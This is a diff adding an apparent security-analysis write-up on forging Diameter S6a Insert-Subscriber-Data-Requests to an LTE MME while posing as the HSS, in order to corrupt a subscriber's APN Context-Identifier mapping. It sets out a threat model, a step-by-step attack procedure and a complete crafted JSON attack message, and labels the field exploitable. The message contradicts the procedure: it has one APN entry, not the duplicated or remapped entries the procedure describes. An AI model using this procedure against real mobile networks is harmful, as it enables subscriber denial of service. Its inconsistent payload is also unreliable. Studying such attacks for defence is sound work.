@@ -1,0 +1,108 @@
+### **Threat Model:**
+- **Attack Assumption:**
+  - On S6a, the victim is the **MME** and the expected sender is the **HSS**. We assume the MME exposes Diameter and, due to missing peer authentication, accepts a forged **Insert-Subscriber-Data-Request (IDR)** from an attacker impersonating the HSS. The attacker targets a known subscriber and includes `Subscription-Data` with an `APN-Configuration-Profile` update.
+
+- **Attacker Capability:**
+  - The attacker can open its own Diameter connection to the MME, send crafted **IDR Requests**, and receive the corresponding answers. The attacker cannot observe or alter legitimate HSS-MME traffic and has no extra NAS/GTP/radio capabilities. Any exploit must therefore arise from how the MME processes the forged IDR and, specifically, the supplied `Subscription-Data.APN-Configuration-Profile.APN-Configuration.Context-Identifier`.
+
+### **Exploitability Analysis:**
+`APN-Configuration.Context-Identifier` is **field-specifically exploitable** in this context because it is not merely descriptive metadata; it is an authoritative identifier used by the MME to index APN subscription entries inside the subscriber profile pushed by the HSS.
+
+In an S6a IDR, the MME treats `Subscription-Data` as authoritative provisioning input and stores the `APN-Configuration-Profile` for later attach/PDN decisions. Within that profile, each `APN-Configuration` is identified by its child `Context-Identifier`, while the parent `APN-Configuration-Profile.Context-Identifier` names the default APN configuration by referring to one of those child identifiers. That makes the target field a control point for how APN entries are bound and selected.
+
+A forged IDR can therefore use a malicious child `Context-Identifier` to change receiver behavior in ways caused specifically by this field:
+- **Remap the default APN** by making a different `APN-Configuration` instance carry the identifier referenced by the parent default context.
+- **Break referential integrity** so the parent default identifier points to no valid child entry.
+- **Create duplicate identifiers** across multiple APN configurations, causing overwrite, ambiguous selection, or profile rejection depending on implementation.
+
+The causal chain is concrete: forged IDR -> MME parses and stores APN profile -> child `Context-Identifier` changes internal APN entry identity/default binding -> later attach or PDN Connectivity processing uses the wrong or invalid APN profile entry -> default PDN establishment may use the wrong APN or fail. This can yield subscriber-visible denial of service or mis-selection of APN/routing without requiring any attacker capability outside forged Diameter requests.
+
+This is more than procedure-only impact. A forged IDR is generally dangerous, but the incremental effect here comes from the fact that **this specific field controls which APN configuration entry is selected or referenced**. Changing only this field can plausibly alter default-APN resolution or corrupt the APN profile mapping even if APN names, PDN type, and QoS siblings are otherwise unchanged.
+
+The effect is typically **stored/cached** in the MME subscriber context and reused on later attach/PDN procedures. It is not necessarily permanent-later HSS updates, re-attach, or subscriber reload can overwrite it-but temporary persistence is sufficient for exploitable service impact.
+
+### **Attack Procedure:**
+1. Establish a Diameter connection to the victim **MME** while impersonating the expected **HSS** role.
+2. Send a forged **Insert-Subscriber-Data-Request** for a known subscriber (`User-Name`/IMSI).
+3. Include `Subscription-Data > APN-Configuration-Profile` with:
+   - a parent `Context-Identifier` designating the default APN context,
+   - at least two `APN-Configuration` entries,
+   - the target child `APN-Configuration.Context-Identifier` set to a malicious value that either duplicates another entry or remaps which entry matches the parent default identifier.
+4. Keep required siblings semantically coherent, especially `Service-Selection`, so the profile is accepted and stored.
+5. Success is observed if the MME accepts the IDR and the subscriber later experiences wrong default APN selection, PDN establishment failure, or attach/default bearer failure traceable to the modified APN context mapping.
+
+### **Attack Message:**
+```json
+{
+  "diameter_header": {
+    "version": 1,
+    "flags": ["Request", "Proxiable"],
+    "command_code": 319,
+    "application_id": 16777251
+  },
+  "avps": [
+    {
+      "name": "Session-Id",
+      "value": "fakehss.example.net;1729000001;12345"
+    },
+    {
+      "name": "Auth-Session-State",
+      "value": 1
+    },
+    {
+      "name": "Origin-Host",
+      "value": "fakehss.example.net"
+    },
+    {
+      "name": "Origin-Realm",
+      "value": "example.net"
+    },
+    {
+      "name": "Destination-Host",
+      "value": "mme01.epc.example.net"
+    },
+    {
+      "name": "Destination-Realm",
+      "value": "epc.example.net"
+    },
+    {
+      "name": "Vendor-Specific-Application-Id",
+      "value": {
+        "Vendor-Id": 10415,
+        "Auth-Application-Id": 16777251
+      }
+    },
+    {
+      "name": "User-Name",
+      "value": "001010123456789"
+    },
+    {
+      "name": "IDR-Flags",
+      "value": 0
+    },
+    {
+      "name": "Subscription-Data",
+      "value": {
+        "APN-Configuration-Profile": {
+          "Context-Identifier": 1,
+          "All-APN-Configurations-Included-Indicator": 0,
+          "APN-Configuration": [
+            {
+              "Context-Identifier": 1,
+              "Service-Selection": "blackhole",
+              "PDN-Type": 0,
+              "AMBR": {
+                "Max-Requested-Bandwidth-UL": 500000,
+                "Max-Requested-Bandwidth-DL": 1000000
+              }
+            }
+          ]
+        }
+      }
+    }
+  ]
+}
+```
+
+### **Classification:**
+- `EXPLOITABLE`
